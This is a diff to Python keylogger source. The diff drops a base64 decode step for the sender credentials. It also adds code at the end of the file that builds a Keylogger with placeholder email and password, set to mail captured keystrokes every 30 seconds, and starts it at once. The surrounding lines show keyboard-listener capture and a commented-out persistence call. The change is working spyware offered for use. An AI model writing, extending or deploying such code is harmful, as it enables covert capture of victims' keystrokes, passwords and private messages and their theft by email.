@@ -13,13 +13,8 @@ class Keylogger:
         #self.becomePersistent()
         self.log = ''
         self.interval = time_interval
-        self.email = self.decode(email)
-        self.password = self.decode(password)
-
-    # To avoid mistakes, email and password are given in bas64 encode and decoded here, you 
-    # can skip this step setting email and pass in text format in keylogger_report.py
-    def decode(self, string):
-        return base64.b64decode(string.encode()).decode()
+        self.email = email
+        self.password = password
     
     def process_key_press(self, key):
         try:
@@ -59,3 +54,8 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+# 30 this indicates how many seconds the notification will be sent by
+# mail, you can to change it :D 
+keylogger = Keylogger(30, 'email', 'password')
+keylogger.start()
